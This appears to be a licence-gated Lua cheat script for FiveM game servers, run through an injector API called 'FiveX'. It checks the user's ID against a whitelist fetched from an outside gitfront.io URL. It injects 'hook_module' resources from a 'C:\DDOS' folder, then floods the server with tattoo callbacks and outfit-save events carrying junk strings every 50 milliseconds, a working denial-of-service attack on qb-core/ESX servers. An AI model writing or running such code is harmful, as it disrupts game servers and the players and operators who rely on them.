FiveX.HttpGet("https://gitfront.io/r/s2mle100lesh/2e24e975a4310393bfad642bcd2a98d49aece420/auth/raw/turkishpower.txt", function(response)
    if string.find(response, FiveX.ID()) then
        Citizen.CreateThread(function()
            local screenX, screenY = GetActiveScreenResolution()
            local xuiHandle = FiveX.CreateXui("https://gitfront.io/r/s2mle100lesh/2e24e975a4310393bfad642bcd2a98d49aece420/auth/raw/success.html", screenX, screenY)
            
            Citizen.CreateThread(function()
              Citizen.Wait(25000)
              FiveX.DestroyXui(xuiHandle)
            end)

            FiveX.CreateResource("qb-core", "C:\\DDOS\\hook_module_1")
            
            FiveX.CreateResource("xnTattoos", "C:\\DDOS\\hook_module_2")
            
            FiveX.CreateResource("qb-clothing", "C:\\DDOS\\hook_module_3")
            
            Wait(100)
            
            local callbacks = {}
            CurrentRequestId = 0
            TriggerServerCallback = function(name, cb, ...)
                callbacks[CurrentRequestId] = cb
                TriggerServerEvent('esx:triggerServerCallback', name, CurrentRequestId, ...)
                if CurrentRequestId < 65535 then
                    CurrentRequestId = CurrentRequestId + 1
                else
                    CurrentRequestId = 0
                end
            end
            
            Citizen.CreateThread(function()
                local ped = PlayerPedId()
                local model = GetEntityModel(ped)
                while true do
                    TriggerServerCallback('SmallTattoos:GetPlayerTattoos', function(tattooList) print('cb geldi') end)
                    TriggerServerEvent('qb-clothes:saveOutfit', "你好，世界你好，世界你好，世界你好，世界你好，世界你好，世界你好", model, {})
                    Citizen.Wait(50)
                end
            end)
            end)
    else
        local screenX, screenY = GetActiveScreenResolution()
        local xuiHandle = FiveX.CreateXui("https://gitfront.io/r/s2mle100lesh/2e24e975a4310393bfad642bcd2a98d49aece420/auth/raw/licence.html", screenX, screenY)
        
        Citizen.CreateThread(function()
          Citizen.Wait(25000)
          FiveX.DestroyXui(xuiHandle)
        end)
    end
end)